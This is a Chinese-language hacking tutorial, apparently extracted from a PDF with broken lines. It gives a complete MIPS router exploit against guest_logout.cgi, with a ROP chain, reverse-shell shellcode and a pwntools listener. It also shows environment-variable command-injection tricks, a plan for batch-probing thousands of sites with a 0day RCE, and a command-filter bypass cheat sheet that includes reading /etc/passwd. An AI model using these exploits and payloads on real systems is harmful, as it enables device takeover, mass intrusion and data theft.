定是 post 攻击方法 
gdb-server 我们内部使用  
https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%9
9%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8% 
使用 wget 下载到 /tmp 目录 通过上一次的`netstat`扫描 确定进程
号 并且绑定进程号 格式如下 
./gdb.server : --attach  
在 exp 上 我利用 cyclic 脚本来确定溢出点  
exp 如下： 
import requests 
import requests 
payload 
= 
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaa
apaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabe
aabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaa
btaabuaabvaabwaabxaabyaab' 
#(cyclic 200) 
url = "https://10.10.10.1/guest_logout.cgi" 
payload 
= 
{"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+pa
yload,"cip":"192.168.1.100"} 
requests.packages.urllib3.disable_warnings() 
requests.post(url, data=payload, verify=False, timeout=1) 
打开 gdb multiarch 这样设置 
#(记得按 c) 
发送 exp 后 成功 确定了溢出点为 aaaw 通过 cyclic -l 查询 发现
为 85 
现在 我们就可以准备构造语句了 
ROP Get shell 
mips 架构硬件并不支持 nx，所以利用方式通常为劫持程序流执行
shellcode 
由于 sscanf 栈溢出，所以不能有空字节，而程序本身的 gadget 都是
有空字节的。。。 
这时候自然想到用 libc 的 gadget，但是，比较诡异的一点是，它的
libc 基址每次都不变 
这里 我们可以通过`cat /proc//maps`查看 
所以 我们就要通过 ret2libc 的方式 getshell 我们选择/lib/libc.so.0 
利用 mipsgadget 发现两条有用的 gadgets 
|  0x000257A0  |  addiu $a0,$sp,0x58+var_40  |  jalr  $s0  | 
|  0x0003D050  |  move $t9,$a0  |  jalr  $a0  | 
这样会造成什么效果呢？程序返回时，程序执行流被控制为 0x257a0，
去执行第一条 gadget，a0 = sp + 0x18，jmp 到 s0 寄存器，s0 寄存
器存的是第二条 gadget，继而去执行第二条 gadget，将 a0 放到 t9，
然后 jmp 到 a0，a0 存的是 shellcode 的地址，于是程序就会执行
shellcode 
Shellcode 
我们 shellcode 用 msfvenom 不会生产空字节  
那么小伙伴可能要问了 *那 s0 寄存器地址怎么算呢？* 
其实 只要用我们第一次算溢出的图用 cyclic 算就行了 也就是`cyclic 
-l aaan` 
Exp: 
import requests 
from pwn import * 
p = listen(8788) 
context.arch = 'mips' 
context.endian = 'little' 
context.os = 'linux' 
libc = 0x2af98000 
jmp_a0 = libc + 0x0003D050  # move  $t9,$a0             ; jalr  $a0 
jmp_s0 = libc + 0x000257A0  # addiu $a0,$sp,0x38+var_20 ; jalr  $s0 
(var_20) = -20 
buf =  b"" 
buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd" 
buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01" 
buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f" 
buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\x54\x0e\x3c" 
buf += b"\x22\x54\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0" 
buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff" 
buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01" 
buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f" 
buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff" 
buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff" 
buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf" 
buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf" 
buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc" 
buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01" 
buf += b"\x01\x01" 
payload1 = "status_guestnet.asp" 
payload1 += 'a' * 49 + p32(jmp_a0)  # control $s0 
payload1 += (85 - 49 - 4) * 'a' + p32(jmp_s0) # control gadgets2 , 
retuen to jmp_s0 
payload1 += 'a' * 18 + buf # control $sp + 18 
url = "https://192.168.1.1/guest_logout.cgi" 
payload2 = { 
    "cmac": "12:af:aa:bb:cc:dd", 
    "submit_button": payload1, 
    "cip": "192.168.1.100" 
} 
requests.packages.urllib3.disable_warnings() #Hide warnings 
requests.post(url, data=payload2, verify=False, timeout=1) 
p.wait_for_connection() 
log.success("getshell") 
p.interactive() 
成功 getshell 
php 环境变量注入 
某次在 P 牛的知识星球划水，发现了一个很骚的思路如下 
我们可以看到两个点，putenv，传入的参数 envs 和最后的不可控变
量 system 
这篇文章已经说得很详细了 
https://tttang.com/archive/1450/ 
所以这里只是简单总结，如果想深入研究可以看看这篇帖子 
下载源码然后看到这个文件\glibc-2.31\libio\iopopen.c，我们可以在
89 行看到的执行 sh -c，加上 p 牛的那段代码，最终输出的是 sh -c 
echo hello 
Readfile 的目的是读取 SHELL 中的 profile 文件 
然后我们可以看到这段代码的 257 行，name 被 expandstr 解析 
文章里说，iflag 经过分析是表示是否传入-i 参数，然后我溯源的时候
发 现 应 该 是 在 \dash-0.5.10.2\src\options.h
文 件 和 \dash-
0.5.10.2\src\options.c 文件中定义的 
所以后面传参过去-i -c 就可以了 
ENV='$(id 1>&2)' dash -i -c 'echo hello' 
最后经过大佬的分析，在文件 variables.c 这段代码中 
Parse_and_execute 执行 temp_string 
我们可以在 bash-4.4-beta2\bash-4.4-beta2\builtins\evalstring.c 文
件看到该函数 
不过其实哪怕看其他几个传参点也能知道 parse_and_excute 执行的
就是 shell 命令 
最后以 p 牛给的几个途径完结 
BASH_ENV：可以在 bash -c 的时候注入任意命令  
ENV：可以在 sh -i -c 的时候注入任意命令  
PS1：可以在 sh 或 bash 交互式环境下执行任意命令  
PROMPT_COMMAND：可以在 bash 交互式环境下执行任意命令  
BASH_FUNC_xxx%%：可以在 bash -c 或 sh -c 的时候执行任意命令 
env 'BASH_FUNC_echo()=() { id; }' bash -c "echo hello" 
当然除了这种，还有个 LD_PRELOAD，我这里就不复现了，感兴趣的
可以看看 
http://www.hackdig.com/01/hack-572721.htm 
POC/EXP 编写 
RCE 的原理大家基本都懂了，但比如挖到了 0day，基本都是几千个
站及以上了，如果刷分的话手测得累死，所以需要自己开发 poc 进行
批量探测 
这里先拿一个简单的 get 传参的 rce 来写 
用一个小 0day 来做示范，如下 
利用 payload 
/data/manage/cmd.php?cmd=whoami 
可以看到成功回显 
那么思路就很清晰了，rce 直接用输出的数据，然后判断返回包是否
存在，导入 request 包，然后传参，判断返回包是否存在我们想要的 
Exp 编写如下： 
我们可以看到后面使我们的命令回显，那么我们之前的
字符都不需要，所以 print 出下标和整个 html 代码 
我们可以看到我们的命令回显在=10) :比如 ca${21}t a.txt 表示 cat a.txt 
在没有传入参数的情况下,这些特殊字符默认为空,如下: 
wh$1oami 
who$@ami 
whoa$*mi 
5 利用未赋值变量绕过 
cat /etc$u/passwd 
cat$u /etc/passwd 
6 通配符绕过 
cat /passwd： 
??? /e??/?a???? 
cat /e*/pa*  
7 base 编码绕过 
echo 'Y2F0wqAK' | base64 -d '1.txt' 
8 过滤分割符 | & ； 
  ;  //分号 
  |  //只执行后面那条命令 
  ||  //只执行前面那条命令 
  &  //两条命令都会执行 
  &&  //两条命令都会执行 
  %0a      //换行符 
  %0d     //回车符号 
  用?>代替； 
  在 php 中可以用?>来代替最后的一个；，因为 php 遇到定界符关闭
标签会自动在末尾加上一个分号 
9 远程下载/复制绕过 
Copy，wget，curl 等函数，不直接写入文件，而是远程下载来保存文
件 
当然除了这些肯定还有很多绕过方法，不过本篇文章不着重于此处，
可自行搜索 
文章中部分是互联网的案例与素材，上上下下看了快几百个网站进行
资料查找，问了很多大佬，全程自己打字写所以肯定会有错误，看到
有技术性错误私聊我进行修改 or 删除，因为参考站点太多了，这里
就不一一写引用了，如有侵权请私信我修改 or 删除 
Author:  Zac 
公众号 ZAC 安全 
微信号 zacaq999 
知识星球 ZAC